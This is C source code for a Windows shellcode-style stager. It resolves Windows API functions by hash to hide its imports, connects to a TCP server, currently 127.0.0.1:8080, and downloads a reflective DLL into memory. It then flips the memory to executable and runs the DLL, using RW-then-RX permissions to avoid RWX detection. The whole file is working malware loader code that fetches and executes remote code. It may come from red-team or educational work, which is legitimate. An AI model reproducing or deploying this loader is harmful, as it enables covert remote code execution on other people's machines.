#include "peb_lookup.h"
#include "debug.h"

#include <Windows.h>

typedef int(PASCAL FAR* _WSAStartup)(
	_In_ WORD wVersionRequired,
	_Out_ LPWSADATA lpWSAData);

typedef SOCKET(PASCAL FAR* _socket)(
	_In_ int af,
	_In_ int type,
	_In_ int protocol);

typedef int(PASCAL FAR* _connect)(
	_In_ SOCKET s,
	_In_reads_bytes_(namelen) const struct sockaddr FAR* name,
	_In_ int namelen);

typedef int(PASCAL FAR* _recv)(
	_In_ SOCKET s,
	_Out_writes_bytes_to_(len, return) __out_data_source(NETWORK) char FAR* buf,
	_In_ int len,
	_In_ int flags);

typedef int(PASCAL FAR * _closesocket)(
	IN SOCKET s);

typedef int(PASCAL FAR * _WSACleanup)(void);

typedef LPVOID(WINAPI* _VirtualAlloc)(
	_In_opt_ LPVOID lpAddress,
	_In_ SIZE_T dwSize,
	_In_ DWORD flAllocationType,
	_In_ DWORD flProtect);

typedef BOOL(WINAPI* _VirtualProtect)(
	_In_ LPVOID lpAddress,
	_In_ SIZE_T dwSize,
	_In_ DWORD  flNewProtect,
	_Out_ PDWORD lpflOldProtect);

int main() {
	// kernel32.dll
	void* kernel32Module = GetModuleByHash(0x7040ee75);
	if (!kernel32Module) {
		return 1;
	}

	DebugInitialise(kernel32Module);

//#pragma comment(lib, "ws2_32.lib")
//	LoadLibraryA("ws2_32.dll");
//
//#pragma comment(lib, "user32.lib")
//	LoadLibraryA("user32.dll");

	// ws2_32.dll
	void* wsModule = GetModuleByHash(0x9ad10b0f);
	if (!wsModule) {
		return 2;
	}

	// Case sensitive hashes
	DefineImportedFuncPtrByHash(wsModule, WSAStartup, 0x6128c683);
	DefineImportedFuncPtrByHash(wsModule, socket, 0x1c31032e);
	DefineImportedFuncPtrByHash(wsModule, connect, 0xd3764dcf);
	DefineImportedFuncPtrByHash(wsModule, recv, 0x7c9d4d95);
	DefineImportedFuncPtrByHash(wsModule, closesocket, 0x494cb104);
	DefineImportedFuncPtrByHash(wsModule, WSACleanup, 0x7f1aab78);

	WSADATA wsaData;
	SecureZeroMemory(&wsaData, sizeof(wsaData));
	if (WSAStartupFuncPtr(MAKEWORD(2, 2), &wsaData) != 0) {
		return 3;
	}

	int returnValue = 0;

	DebugWriteChars('s', 'o', 'c', 'k', 'e', 't', '\n');

	// Create a socket
	SOCKET clientSocket = socketFuncPtr(AF_INET, SOCK_STREAM, 0);
	if (clientSocket == INVALID_SOCKET) {
		returnValue = 4;
		goto CleanupNoSocket;
	}

	struct sockaddr_in serverAddr;
	serverAddr.sin_family = AF_INET;

	// sin_port needs to be big endian, 
	// therefore if server port is 8080 (0x1F90), 
	// it will become 36895 (0x901F)
	serverAddr.sin_port = 0x901F;

	// similarly, sin_addr needs to be big endian, 
	// it's a 32 bit unsigned int, so 127.0.0.1 
	// (0x7F, 0x00, 0x00, 0x01) will become 0x0100007F
	serverAddr.sin_addr.S_un.S_addr = 0x0100007F;
	
	//serverAddr.sin_port = 0x901F;

	DebugWriteChars('c', 'o', 'n', 'n', 'e', 'c', 't', '\n');

	// Connect to the server
	if (connectFuncPtr(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
		returnValue = 5;
		goto Cleanup;
	}

	DebugWriteChars('r', 'e', 'c', 'v', '\n');

	// Get message from the socket: the size of the reflective DLL
	unsigned int sizeRequired = 0;
	if (recvFuncPtr(clientSocket, (char*)&sizeRequired, sizeof(sizeRequired), 0) == SOCKET_ERROR) {
		returnValue = 6;
		goto Cleanup;
	}

	DebugWriteChars('d', 'l', 'l', ' ', 's', 'i', 'z', 'e', '\n');
	DebugWriteIntAndFlush(sizeRequired);

	DefineImportedFuncPtrByHash(kernel32Module, VirtualAlloc, 0x382c0f97);
	DefineImportedFuncPtrByHash(kernel32Module, VirtualProtect, 0x844ff18d);

	// Allocate space for the reflective DLL using the previous message
	// Use Read Write permissions for the memory to avoid RWX allocations
	void* const allocatedMemoryPtr = VirtualAllocFuncPtr(
		NULL, 
		sizeRequired,
		MEM_RESERVE | MEM_COMMIT, 
		PAGE_READWRITE);
	if (!allocatedMemoryPtr) {
		DebugWriteLastError();
		returnValue = 7;
		goto Cleanup;
	}

	// Receive the reflective DLL
	unsigned int totalBytesReceived = 0;
	unsigned char* currentWritePointer = allocatedMemoryPtr;
	int remainingBufferSize = sizeRequired;

	DebugWriteChars('l', 'o', 'o', 'p', '\n');

	while (totalBytesReceived < sizeRequired) {
		int bytesReceived = recvFuncPtr(
			clientSocket, 
			currentWritePointer, 
			remainingBufferSize, 
			0);
		if (bytesReceived == SOCKET_ERROR) {
			returnValue = 8;
			goto Cleanup;
		}

		// Can be removed and the loop condition changed to
		// while (remainingBufferSize > 0)
		totalBytesReceived += bytesReceived;
		currentWritePointer += bytesReceived;
		remainingBufferSize = sizeRequired - (currentWritePointer - allocatedMemoryPtr);
	}

	// Change memory protection to Execute Read - the usual permissions used for actual code
	DWORD oldProtect = 0;
	if (!VirtualProtectFuncPtr(allocatedMemoryPtr, sizeRequired, PAGE_EXECUTE_READ, &oldProtect)) {
		returnValue = 9;
		goto Cleanup;
	}

	//typedef int (*ReflectiveLoaderFunctionType)(LPVOID kernel32Module, unsigned int allocationSize);

	// Execute the newly received reflective DLL loeader
	typedef int (*ReflectiveLoaderFunctionType)();
	ReflectiveLoaderFunctionType allocatedReflectiveFunction = (ReflectiveLoaderFunctionType)allocatedMemoryPtr;

	DebugWriteChars('i', 'n', 'v', 'o', 'k', 'e', '\n');

	returnValue = allocatedReflectiveFunction();

	// Close the socket and clean up
Cleanup:
	closesocketFuncPtr(clientSocket);

CleanupNoSocket:
	WSACleanupFuncPtr();

	return returnValue;
}